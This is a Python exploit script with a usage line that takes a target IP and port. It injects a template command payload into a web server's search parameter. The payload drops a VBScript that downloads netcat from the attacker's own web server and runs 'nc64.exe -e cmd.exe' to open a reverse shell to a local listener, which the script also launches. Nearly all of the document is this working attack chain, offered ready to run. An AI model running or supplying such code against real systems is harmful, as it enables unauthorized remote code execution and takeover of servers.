#Usage : python Exploit.py <Target IP address> <Target Port Number>
# This script supposes that :
#  1/- you already have nc64.exe binary in c:\Tool\netcat-win32-1.12 folder.
#  2/- you will be listening on all IPs on port 443
#  3/- you will be serving files on port 80
# So if you need to update these details...

import urllib.request, urllib.error, urllib.parse
import sys
import subprocess
import os
import time
import shutil

try:
	def start_listener():
		command = 'c:\\Tools\\nc64.exe -nlvp 443'
		subprocess.Popen(['start', 'cmd', '/K', command], shell=True)
		print(f"[+] Listener is started")

	def start_webServer():
		# Specify the directory you want to serve
		directory_to_serve = "c:\\Tools"

		# Ensure the directory exists
		if not os.path.exists(directory_to_serve):
			print(f"Directory {directory_to_serve} does not exist.")
			sys.exit()
		else:
			# Start the HTTP server in a subprocess (on port 80)
			command = 'python -m http.server 80 --directory c:\\Tools'
			subprocess.Popen(['start', 'cmd', '/K', command], shell=True)

			# Notify the user that the server is running
			print(f"[+] Webserver is started")
    
	def script_create():
		urllib.request.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib.request.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib.request.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	if len(sys.argv) < 2:
		print("""[-] Usage is: python exploit.py <Target IP address> <Target Port Number>
		example : python exploit.py 192.168.116.252 80
		""")
		sys.exit()

	if not os.path.exists("c:\\Tools\\nc64.exe"):
		shutil.copy2("c:\\Tools\\netcat-win32-1.12\\nc64.exe", "c:\\Tools\\nc64.exe")
	ip_addr = "70.70.70.10" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\\Users\\Public\\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc64.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc64.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc64.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3

	start_listener()
	start_webServer()
	print(f"[*] Check your listener!")
	script_create()
	time.sleep(1)
	execute_script()
	time.sleep(2)
	while True:
                nc_run()
                user_input = input("Received the shell? Type 'yes' to confirm, 'no' to retry, or 'exit' to quit: ").strip().lower()
                if user_input == 'yes':
                        print("Thank you! Proceeding...")
                        break
                elif user_input == 'no':
                        print("Retrying...")
                elif user_input == 'exit':
                        print("Exiting as requested.")
                        break
                else:
                        print("Invalid input. Please type 'yes', 'no', or 'exit'.")
	
except:
	print("""[-] Oops! Something went wrong..!""")
	
